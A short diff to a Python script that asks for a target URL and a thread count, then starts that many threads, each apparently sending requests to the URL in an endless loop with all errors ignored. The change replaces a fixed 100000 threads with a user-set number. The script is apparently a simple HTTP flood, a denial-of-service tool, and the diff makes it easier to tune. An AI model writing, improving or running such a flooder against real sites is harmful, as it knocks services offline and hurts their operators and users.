@@ -1,6 +1,7 @@
 import requests
 import threading
 url = input("URL> ")
+threads = int(input("Threads> "))
 
 def yes():
     while True:
@@ -10,5 +11,5 @@ def yes():
         except:
             pass
 
-for i in range(100000): 
+for i in range(threads): 
     threading.Thread(target=yes).start()
